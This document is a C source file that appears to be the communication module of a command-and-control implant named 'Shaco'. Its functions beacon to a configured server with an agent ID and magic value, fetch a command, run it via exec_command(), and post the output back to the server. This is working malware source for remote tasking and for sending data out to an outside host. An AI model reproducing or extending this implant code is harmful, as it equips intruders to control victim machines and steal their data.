#include "Communication.h"
#include "Commands.h"

#include "../Protocol/Packer.h"
#include "../Helpers/Http.h"
#include "../Config/Settings.h"

#include "../Common/shaco_stdlib.h"

bool send_knife(PPACKER poison, uint32_t cmdid){
    bool success = false;
    if(!poison) goto EXIT;
    PHTTP_RESPONSE resp = NULL;
    size_t size = packer_get_size(poison);
    PSETTINGS sett = get_settings();
    PPACKER packer = packer_init();
    if(!packer) { MSG("Erro in creating packer"); goto EXIT;} 

    packer_add_int32(packer, size);
    packer_add_int32(packer, SHACO_MAGIC);
    packer_add_int32(packer, sett->agent_id);
    packer_add_int32(packer, COMMAND_OUTPUT);
    packer_add_int32(packer, cmdid);
    packer_add_data(packer,packer_get_buffer(poison),packer_get_size(poison));

    MSG("Sending response, size: %zu", packer_get_size(packer));
    resp = http_post(sett->ip, sett->domain, sett->endpoint, sett->useragent, sett->port,sett->ssl, packer_get_buffer(packer), packer_get_size(packer));
    if(!resp) MSG("can't send output");
    success = true;

EXIT:
    if(resp) http_free(resp);
    if(packer) packer_free(packer);
    return success;
}


bool boxboxbox(){
    bool success = false;
    PHTTP_RESPONSE response = NULL;
    PSETTINGS sett = get_settings();
    PPACKER packer = packer_init(), pack = NULL;
    if(!packer) { MSG("Erro in creating packer"); goto EXIT;}
    
    packer_add_int32(packer, 0);
    packer_add_int32(packer, SHACO_MAGIC);
    packer_add_int32(packer, sett->agent_id);
    packer_add_int32(packer, COMMAND_GET);

    MSG("Getting command from server");
    response = http_post(sett->ip, sett->domain, sett->endpoint, sett->useragent, sett->port, sett->ssl, packer_get_buffer(packer), packer_get_size(packer));
    if(!response) { MSG("Error in sending post"); goto EXIT; }

    size_t _tmp = 0;
    int cmd_id = packer_get_int32((uint8_t *)response->response, &_tmp);
    if(cmd_id == COMMAND_NO_JOB || cmd_id == COMMAND_ERR ) { MSG("no job"); goto EXIT;}
    pack = exec_command((uint8_t *)response->response, cmd_id); //TODO: upload command not work correct because the int32

    if(!pack) goto EXIT;
    if(!send_knife(pack, cmd_id)) { MSG("send response error"); goto EXIT;};

    success = true;
EXIT:
    if(response) { ZeroMemory(response, sizeof(HTTP_RESPONSE)); shaco_free(response);}
    if(packer) packer_free(packer);
    if(pack) packer_free(pack);
    return success;
}

